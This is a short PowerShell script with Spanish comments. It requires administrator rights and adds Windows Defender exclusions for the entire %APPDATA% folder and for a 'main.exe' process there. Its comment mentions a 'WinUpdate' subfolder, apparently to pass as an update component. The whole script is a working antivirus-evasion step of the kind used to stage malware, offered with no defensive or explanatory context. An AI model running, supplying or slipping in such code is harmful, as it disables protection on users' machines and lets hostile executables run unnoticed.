# Verifica si se está ejecutando como administrador
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "Este script debe ejecutarse como administrador."
    Pause
    exit
}

# Obtener ruta de APPDATA
$appdata = $env:APPDATA
$ejecutable = Join-Path $appdata "main.exe"

# Agregar exclusión para la carpeta %APPDATA%\WinUpdate
Add-MpPreference -ExclusionPath $appdata

# Agregar exclusión para el ejecutable main.exe
Add-MpPreference -ExclusionProcess $ejecutable
